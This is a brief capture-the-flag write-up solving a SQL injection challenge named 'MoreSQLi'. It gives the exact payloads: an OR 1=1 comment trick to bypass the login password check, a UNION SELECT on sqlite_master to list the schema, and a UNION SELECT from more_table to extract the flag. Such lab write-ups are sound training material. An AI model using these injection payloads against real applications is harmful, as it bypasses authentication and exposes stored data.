# MoreSQLi solution

Tried a random login (admin,admin) it showed me a page with the sql query , so just "'or 1=1;-- " in password beacuse it comes first and it lets you login
Go to schema table , in sli lite , "' union select sql,1,1 from sqlite_master;-- " to match the column in the table we are in 
We can see the flag is in this table:CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
so "' union select id,flag,1 from more_table;--" , and get the flag
